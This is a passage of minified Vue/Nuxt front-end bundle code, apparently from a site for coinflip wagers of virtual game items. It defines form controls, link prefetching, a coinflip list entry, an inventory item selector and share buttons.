                    staticClass: "form-input form-input-dark",
                    attrs: {
                        type: "text",
                        placeholder: t.placeholder
                    },
                    on: {
                        input: function(e) {
                            return t.$emit("input", t.$el.value)
                        }
                    }
                })
            }), [], !1, null, "1a6a289c", null);
        e.default = component.exports
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    placeholder: {
                        type: String,
                        default: ""
                    },
                    options: {
                        type: Array,
                        default: function() {
                            return []
                        }
                    }
                }
            },
            o = (r(333), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("select", {
                    staticClass: "form-select form-select-dark",
                    on: {
                        input: function(e) {
                            return t.$emit("input", t.$el.value)
                        }
                    }
                }, t._l(t.options, (function(option, i) {
                    return r("option", {
                        key: i,
                        staticClass: "form-select-option",
                        domProps: {
                            value: i
                        }
                    }, [t._v("\n    " + t._s(option) + "\n  ")])
                })), 0)
            }), [], !1, null, "7957dde0", null);
        e.default = component.exports
    }, function(t, e, r) {
        var content = r(286);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("05920f91", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(288);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("3b37cc00", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(290);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("28e6dcb0", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(292);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("b8e0185c", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(294);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("e7f370a0", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(300);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("4a17d7b6", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(302);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("324b2994", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(304);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("8e78934a", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(306);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("5e6bc624", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(308);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("d71a64ea", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(310);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("0140467f", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(312);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("d9269f3e", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(314);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("c8a974d6", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(316);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("d1528d6a", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(318);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("df25ae2e", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(320);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("2ebbd5d2", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(322);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("60f00aef", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(324);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("1c6ff873", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(326);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("532d6ee7", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(328);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("818cd2c8", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(330);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("fe975b84", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(332);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("a81aafec", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(334);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("be842eac", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(336);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("ce396cf6", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(338);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("eeaebcbc", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(340);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("72a956a2", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(342);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("65727667", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(344);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("59d97d97", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(346);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("ae2c0f3e", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(348);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("0fce7ebc", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(352);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("4f1d3d58", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(354);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("ed2bdcb8", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(356);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("35ce2b18", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(358);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("3f87760f", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(361);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("4711d772", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(363);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("55c89a90", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(365);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("2413b7da", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(367);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("93db6da2", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(369);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("d863bb04", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(371);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("06219dc4", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(373);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("e14eecca", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(375);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("c5c7bfa4", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(377);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("4ab85531", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(379);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("62fe59c4", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(381);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("67da92b6", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(383);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("5f1673b0", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(385);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("7b5154b8", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(387);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("490e3600", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(389);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("17e69a1c", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(391);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("4914d29a", content, !0, {
            sourceMap: !1
        })
    }, function(t, e, r) {
        var content = r(393);
        "string" == typeof content && (content = [
            [t.i, content, ""]
        ]), content.locals && (t.exports = content.locals);
        (0, r(4).default)("5f32dd9b", content, !0, {
            sourceMap: !1
        })
    }, , , function(t, e, r) {
        "use strict";
        r(19), r(55), r(56), r(17), r(29), r(57), r(40), r(65), r(41), r(30), r(26), r(42), r(43), r(48), r(31), r(58), r(66);
        var n = r(1);

        function o(t, e) {
            var r;
            if ("undefined" == typeof Symbol || null == t[Symbol.iterator]) {
                if (Array.isArray(t) || (r = function(t, e) {
                        if (!t) return;
                        if ("string" == typeof t) return c(t, e);
                        var r = Object.prototype.toString.call(t).slice(8, -1);
                        "Object" === r && t.constructor && (r = t.constructor.name);
                        if ("Map" === r || "Set" === r) return Array.from(t);
                        if ("Arguments" === r || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(r)) return c(t, e)
                    }(t)) || e && t && "number" == typeof t.length) {
                    r && (t = r);
                    var i = 0,
                        n = function() {};
                    return {
                        s: n,
                        n: function() {
                            return i >= t.length ? {
                                done: !0
                            } : {
                                done: !1,
                                value: t[i++]
                            }
                        },
                        e: function(t) {
                            throw t
                        },
                        f: n
                    }
                }
                throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")
            }
            var o, l = !0,
                d = !1;
            return {
                s: function() {
                    r = t[Symbol.iterator]()
                },
                n: function() {
                    var t = r.next();
                    return l = t.done, t
                },
                e: function(t) {
                    d = !0, o = t
                },
                f: function() {
                    try {
                        l || null == r.return || r.return()
                    } finally {
                        if (d) throw o
                    }
                }
            }
        }

        function c(t, e) {
            (null == e || e > t.length) && (e = t.length);
            for (var i = 0, r = new Array(e); i < e; i++) r[i] = t[i];
            return r
        }
        var l = window.requestIdleCallback || function(t) {
                var e = Date.now();
                return setTimeout((function() {
                    t({
                        didTimeout: !1,
                        timeRemaining: function() {
                            return Math.max(0, 50 - (Date.now() - e))
                        }
                    })
                }), 1)
            },
            d = window.cancelIdleCallback || function(t) {
                clearTimeout(t)
            },
            f = window.IntersectionObserver && new window.IntersectionObserver((function(t) {
                t.forEach((function(t) {
                    var e = t.intersectionRatio,
                        link = t.target;
                    e <= 0 || link.__prefetch()
                }))
            }));
        e.a = {
            name: "NuxtLink",
            extends: n.default.component("RouterLink"),
            props: {
                prefetch: {
                    type: Boolean,
                    default: !0
                },
                noPrefetch: {
                    type: Boolean,
                    default: !1
                }
            },
            mounted: function() {
                this.prefetch && !this.noPrefetch && (this.handleId = l(this.observe, {
                    timeout: 2e3
                }))
            },
            beforeDestroy: function() {
                d(this.handleId), this.__observed && (f.unobserve(this.$el), delete this.$el.__prefetch)
            },
            methods: {
                observe: function() {
                    f && this.shouldPrefetch() && (this.$el.__prefetch = this.prefetchLink.bind(this), f.observe(this.$el), this.__observed = !0)
                },
                shouldPrefetch: function() {
                    return this.getPrefetchComponents().length > 0
                },
                canPrefetch: function() {
                    var t = navigator.connection;
                    return !(this.$nuxt.isOffline || t && ((t.effectiveType || "").includes("2g") || t.saveData))
                },
                getPrefetchComponents: function() {
                    return this.$router.resolve(this.to, this.$route, this.append).resolved.matched.map((function(t) {
                        return t.components.default
                    })).filter((function(t) {
                        return "function" == typeof t && !t.options && !t.__prefetched
                    }))
                },
                prefetchLink: function() {
                    if (this.canPrefetch()) {
                        f.unobserve(this.$el);
                        var t, e = o(this.getPrefetchComponents());
                        try {
                            for (e.s(); !(t = e.n()).done;) {
                                var r = t.value,
                                    n = r();
                                n instanceof Promise && n.catch((function() {})), r.__prefetched = !0
                            }
                        } catch (t) {
                            e.e(t)
                        } finally {
                            e.f()
                        }
                    }
                }
            }
        }
    }, , , , , , , , , , , , , , , , , , , , , , , , , , , function(t, e, r) {
        "use strict";
        r.r(e);
        r(21), r(41), r(8);
        var n = r(2),
            o = {
                props: {
                    coinflip: {
                        type: Object,
                        required: !0
                    }
                },
                computed: {
                    slicedUserAssets: function() {
                        return this.coinflip.userAssets.slice(0, 3)
                    },
                    totalUserAssets: function() {
                        return this.coinflip.userAssets.length
                    },
                    canJoinCoinflip: function() {
                        return this.$auth.loggedIn && this.coinflip.creator.userId != this.$auth.user._id && !this.coinflip.challenger
                    },
                    showWinner: function() {
                        return this.coinflip.status ? "Completed" == this.coinflip.status : null != this.coinflip.winner
                    },
                    winningPlayer: function() {
                        var t = this.coinflip,
                            e = t.winner,
                            r = t.creator;
                        t.challenger;
                        if (null != e) return e.userId == r.userId ? "creator" : "challenger"
                    },
                    min: function() {
                        return this.coinflip.totalValue - .1 * this.coinflip.totalValue
                    },
                    max: function() {
                        return this.coinflip.totalValue + .1 * this.coinflip.totalValue
                    }
                },
                methods: {
                    watchCoinflip: function() {
                        this.$router.push("/coinflips/active/".concat(this.coinflip._id))
                    },
                    joinCoinflip: function() {
                        var option = "Heads" == this.coinflip.creator.option ? "Tails" : "Heads",
                            path = "/bet?coinflipId=".concat(this.coinflip._id, "&min=").concat(this.min, "&max=").concat(this.max, "&option=").concat(option);
                        this.$router.push(path)
                    },
                    removeCoinflip: function() {
                        var t = this;
                        return Object(n.a)(regeneratorRuntime.mark((function e() {
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return e.prev = 0, e.next = 3, t.$axios.$delete("coinflips/".concat(t.coinflip._id));
                                    case 3:
                                        t.$toast.success("Success!"), e.next = 10;
                                        break;
                                    case 6:
                                        e.prev = 6, e.t0 = e.catch(0), console.error(e.t0), t.$toast.error(e.t0.response ? e.t0.response.data.error : e.t0.message);
                                    case 10:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [0, 6]
                            ])
                        })))()
                    }
                }
            },
            c = (r(289), r(0)),
            component = Object(c.a)(o, (function() {
                var t, e = this,
                    r = e.$createElement,
                    n = e._self._c || r;
                return n("div", {
                    staticClass: "coinflip-list__item"
                }, [n("div", {
                    staticClass: "item__players",
                    class: (t = {
                        showWinner: e.showWinner
                    }, t[e.winningPlayer] = !0, t)
                }, [e.coinflip.challenger ? n("NuxtLink", {
                    attrs: {
                        to: "/profiles/" + e.coinflip.challenger.userId
                    }
                }, [n("img", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: {
                            content: e.coinflip.challenger.username,
                            trigger: "hover"
                        },
                        expression: "{content: coinflip.challenger.username, trigger: 'hover'}"
                    }],
                    staticClass: "players__avatar challenger",
                    attrs: {
                        src: e.$util.getUserThumbnail(e.coinflip.challenger.userId)
                    }
                })]) : n("img", {
                    staticClass: "players__option",
                    attrs: {
                        src: "/img/coins/" + e.coinflip.creator.option.toLowerCase() + ".png"
                    }
                }), e._v(" "), n("NuxtLink", {
                    attrs: {
                        to: "/profiles/" + e.coinflip.creator.userId
                    }
                }, [n("img", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: {
                            content: e.coinflip.creator.username,
                            trigger: "hover"
                        },
                        expression: "{content: coinflip.creator.username, trigger: 'hover'}"
                    }],
                    staticClass: "players__avatar creator",
                    attrs: {
                        src: e.$util.getUserThumbnail(e.coinflip.creator.userId)
                    }
                })])], 1), e._v(" "), n("div", {
                    staticClass: "item__user-assets"
                }, [e._l(e.slicedUserAssets, (function(t, i) {
                    return n("a", {
                        key: i,
                        attrs: {
                            href: "https://www.rolimons.com/item/" + t.assetId,
                            target: "_blank"
                        }
                    }, [n("img", {
                        directives: [{
                            name: "tooltip",
                            rawName: "v-tooltip",
                            value: {
                                content: t.userAssetId,
                                trigger: "hover"
                            },
                            expression: "{content: userAsset.userAssetId, trigger: 'hover'}"
                        }],
                        staticClass: "user-assets__image",
                        attrs: {
                            src: e.$util.getAssetThumbnail(t.assetId)
                        }
                    })])
                })), e._v(" "), e.totalUserAssets > 3 ? n("div", {
                    staticClass: "user-assets__placeholder"
                }, [n("span", [e._v("+")]), e._v(" "), n("span", [e._v(e._s(e.totalUserAssets - 3))])]) : e._e()], 2), e._v(" "), n("div", {
                    staticClass: "item__controls"
                }, [n("div", {
                    staticClass: "controls__value"
                }, [n("div", {
                    staticClass: "value__primary"
                }, [e._v(e._s(e._f("shortNumber")(e.coinflip.totalValue)))]), e._v(" "), e.coinflip.challenger ? e._e() : n("div", {
                    staticClass: "value__secondary"
                }, [n("span", [e._v(e._s(e._f("shortNumber")(e.min)))]), e._v(" "), n("span", [e._v("-")]), e._v(" "), n("span", [e._v(e._s(e._f("shortNumber")(e.max)))])])]), e._v(" "), n("div", {
                    staticClass: "controls__status"
                }, ["Processing" == e.coinflip.status ? n("CoinflipKnob", {
                    attrs: {
                        size: 50
                    },
                    model: {
                        value: e.coinflip.timeLeft,
                        callback: function(t) {
                            e.$set(e.coinflip, "timeLeft", t)
                        },
                        expression: "coinflip.timeLeft"
                    }
                }) : e._e(), e._v(" "), e.showWinner ? n("img", {
                    attrs: {
                        src: "/img/coins/" + e.coinflip.winner.option.toLowerCase() + ".png",
                        width: "60px"
                    }
                }) : e._e()], 1), e._v(" "), n("div", {
                    staticClass: "controls__buttons"
                }, [n("div", {
                    staticClass: "buttons__primary"
                }, [e.canJoinCoinflip ? n("button", {
                    staticClass: "btn btn-blue btn-pill btn-full",
                    on: {
                        click: function(t) {
                            return e.joinCoinflip()
                        }
                    }
                }, [n("Span", [e._v("Join")])], 1) : e._e()]), e._v(" "), n("div", {
                    staticClass: "buttons__secondary"
                }, [n("button", {
                    staticClass: "btn btn-gray btn-pill btn-full",
                    on: {
                        click: function(t) {
                            return e.watchCoinflip()
                        }
                    }
                }, [n("Span", [e._v("View")])], 1)])])])])
            }), [], !1, null, "4696e627", null);
        e.default = component.exports;
        installComponents(component, {
            CoinflipKnob: r(248).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        var n = {
                props: {
                    map: {
                        type: Array,
                        required: !0
                    },
                    data: {
                        type: Object,
                        required: !0
                    }
                }
            },
            o = (r(325), r(0)),
            component = Object(o.a)(n, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("ul", {
                    staticClass: "stat-list"
                }, t._l(t.map, (function(e, i) {
                    return r("StatListItem", {
                        key: i,
                        attrs: {
                            label: e.label,
                            prefix: e.prefix,
                            value: t.data[e.key]
                        }
                    })
                })), 1)
            }), [], !1, null, "7811cf9a", null);
        e.default = component.exports;
        installComponents(component, {
            StatListItem: r(99).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(17), r(40), r(225), r(235), r(30), r(44), r(43), r(230), r(349), r(8);
        var n = r(2),
            o = r(253),
            c = {
                props: {
                    userId: {
                        type: Number | String,
                        required: !0
                    },
                    maxItems: {
                        type: Number,
                        default: 6
                    },
                    intangiblesSelectable: {
                        type: Boolean,
                        default: !1
                    }
                },
                data: function() {
                    return {
                        userAssets: [],
                        selectedUserAssets: [],
                        filters: {
                            keywords: "",
                            sortOrder: 0,
                            showRecyclable: !0,
                            showProjected: !0,
                            showSelected: !1,
                            hideSelected: !1
                        }
                    }
                },
                fetch: function() {
                    var t = this;
                    return Object(n.a)(regeneratorRuntime.mark((function e() {
                        var r, n;
                        return regeneratorRuntime.wrap((function(e) {
                            for (;;) switch (e.prev = e.next) {
                                case 0:
                                    return e.next = 2, t.$axios.$get("users/".concat(t.userId, "/inventory"));
                                case 2:
                                    r = e.sent, n = r.data.inventory, t.userAssets = n;
                                case 5:
                                case "end":
                                    return e.stop()
                            }
                        }), e)
                    })))()
                },
                watch: {
                    userId: Object(o.debounce)((function() {
                        +this.userId > 10 && this.$fetch()
                    }), 1500),
                    selectedUserAssets: function(t) {
                        this.$emit("input", t)
                    }
                },
                computed: {
                    filteredUserAssets: function() {
                        var t = this;
                        return this.userAssets.sort((function(a, b) {
                            var e = a.marketValue - b.marketValue;
                            return 0 == t.filters.sortOrder && (e *= -1), e
                        })).filter((function(e) {
                            var r = e.isProjected,
                                n = e.isRecyclable,
                                o = e.name;
                            return !(!t.filters.showRecyclable && n) && (!(!t.filters.showProjected && r) && (!(t.filters.showSelected && !t.selectedUserAssets.includes(e)) && ((!t.filters.hideSelected || !t.selectedUserAssets.includes(e)) && !("" != t.filters.keywords.trim() && !o.toLowerCase().startsWith(t.filters.keywords.toLowerCase())))))
                        }))
                    }
                },
                methods: {
                    toggleUserAsset: function(t) {
                        try {
                            if (!this.intangiblesSelectable && (t.isRecyclable || t.isProjected)) throw new Error("You can not select this item because it is intangible!");
                            var i = this.selectedUserAssets.indexOf(t);
                            if (i > -1) this.selectedUserAssets.splice(i, 1);
                            else {
                                if (!(this.selectedUserAssets.length < this.maxItems)) throw new Error("You can not select anymore assets");
                                this.selectedUserAssets.push(t)
                            }
                        } catch (t) {
                            console.error(t), this.$toast.error(t.message)
                        }
                    }
                }
            },
            l = (r(351), r(0)),
            component = Object(l.a)(c, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "user-asset-selector"
                }, [t.$fetchState.pending ? r("div", [r("Spinner")], 1) : r("div", {
                    staticClass: "user-asset-selector__controls"
                }, [r("div", {
                    staticClass: "controls__form"
                }, [r("FormInput", {
                    staticClass: "form__input",
                    attrs: {
                        placeholder: "Keywords"
                    },
                    model: {
                        value: t.filters.keywords,
                        callback: function(e) {
                            t.$set(t.filters, "keywords", e)
                        },
                        expression: "filters.keywords"
                    }
                }), t._v(" "), r("FormSelect", {
                    staticClass: "form__select",
                    attrs: {
                        placeholder: "Sort order",
                        options: ["Descending", "Ascending"]
                    },
                    model: {
                        value: t.filters.sortOrder,
                        callback: function(e) {
                            t.$set(t.filters, "sortOrder", e)
                        },
                        expression: "filters.sortOrder"
                    }
                }), t._v(" "), r("FormCheckbox", {
                    staticClass: "form__checkbox",
                    attrs: {
                        label: "Selected"
                    },
                    model: {
                        value: t.filters.showSelected,
                        callback: function(e) {
                            t.$set(t.filters, "showSelected", e)
                        },
                        expression: "filters.showSelected"
                    }
                })], 1), t._v(" "), r("ul", {
                    staticClass: "controls__list"
                }, t._l(t.filteredUserAssets, (function(e, i) {
                    return r("li", {
                        key: i,
                        staticClass: "list__item"
                    }, [r("div", {
                        staticClass: "item"
                    }, [r("div", {
                        staticClass: "item__details"
                    }, [r("div", {
                        staticClass: "details__image"
                    }, [r("a", {
                        attrs: {
                            href: "https://rolimons.com/item/" + e.assetId,
                            target: "_blank"
                        }
                    }, [r("img", {
                        directives: [{
                            name: "tooltip",
                            rawName: "v-tooltip",
                            value: {
                                content: e.userAssetId,
                                trigger: "hover"
                            },
                            expression: "{content: userAsset.userAssetId, trigger: 'hover'}"
                        }],
                        attrs: {
                            src: t.$util.getAssetThumbnail(e.assetId),
                            width: "60px",
                            height: "auto"
                        }
                    })])]), t._v(" "), r("div", {
                        staticClass: "details__label isTruncated"
                    }, [t._v(t._s(e.name))]), t._v(" "), r("div", {
                        staticClass: "details__label isValue"
                    }, [t._v("R$ " + t._s(t._f("shortNumber")(e.marketValue)))]), t._v(" "), t.selectedUserAssets.includes(e) || !t.intangiblesSelectable && (e.isRecyclable || e.isProjected) ? t._e() : r("div", {
                        staticClass: "details__label"
                    }, [r("button", {
                        staticClass: "btn btn-blue btn-pill",
                        on: {
                            click: function(r) {
                                return t.toggleUserAsset(e)
                            }
                        }
                    }, [r("span", [t._v("Select")])])])]), t._v(" "), t.selectedUserAssets.includes(e) ? r("div", {
                        staticClass: "item__overlay"
                    }, [r("span", {
                        staticClass: "btn btn-red btn-pill",
                        on: {
                            click: function(r) {
                                return t.toggleUserAsset(e)
                            }
                        }
                    }, [t._v("Deselect")])]) : t._e(), t._v(" "), t.selectedUserAssets.includes(e) || t.intangiblesSelectable || !e.isRecyclable && !e.isProjected ? t._e() : r("div", {
                        staticClass: "item__overlay"
                    }, [e.isProjected ? r("span", {
                        staticClass: "item__pill"
                    }, [t._v("Projected")]) : t._e(), t._v(" "), e.isRecyclable ? r("span", {
                        staticClass: "item__pill"
                    }, [t._v("Small")]) : t._e()])])])
                })), 0)])])
            }), [], !1, null, "0b5cdc82", null);
        e.default = component.exports;
        installComponents(component, {
            Spinner: r(51).default,
            FormInput: r(100).default,
            FormSelect: r(101).default,
            FormCheckbox: r(435).default
        })
    }, function(t, e, r) {
        "use strict";
        r.r(e);
        r(8);
        var n = r(2),
            o = {
                props: {
                    twitterUrl: {
                        type: String,
                        required: !0
                    },
                    shareUrl: {
                        type: String,
                        required: !0
                    }
                },
                methods: {
                    copyUrl: function(t) {
                        var e = this;
                        return Object(n.a)(regeneratorRuntime.mark((function r() {
                            return regeneratorRuntime.wrap((function(r) {
                                for (;;) switch (r.prev = r.next) {
                                    case 0:
                                        return r.prev = 0, r.next = 3, navigator.clipboard.writeText(t);
                                    case 3:
                                        e.$toast.success("Copied!"), r.next = 10;
                                        break;
                                    case 6:
                                        r.prev = 6, r.t0 = r.catch(0), console.error(r.t0), e.$toast.error("Could not copy to clipboard");
                                    case 10:
                                    case "end":
                                        return r.stop()
                                }
                            }), r, null, [
                                [0, 6]
                            ])
                        })))()
                    }
                }
            },
            c = (r(364), r(0)),
            component = Object(c.a)(o, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("div", {
                    staticClass: "media-links"
                }, [r("div", [r("a", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: "Tweet this",
                        expression: "'Tweet this'"
                    }],
                    staticClass: "btn-icon btn-light",
                    attrs: {
                        href: t.twitterUrl,
                        target: "_blank"
                    }
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fab", "twitter"]
                    }
                })], 1), t._v(" "), r("a", {
                    directives: [{
                        name: "tooltip",
                        rawName: "v-tooltip",
                        value: "Copy link",
                        expression: "'Copy link'"
                    }],
                    staticClass: "btn-icon btn-light",
                    attrs: {
                        target: "_blank"
                    },
                    on: {
                        click: function(e) {
                            return t.copyUrl(t.shareUrl)
                        }
                    }
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "link"]
                    }
                })], 1)])])
            }), [], !1, null, "214a0dcb", null);
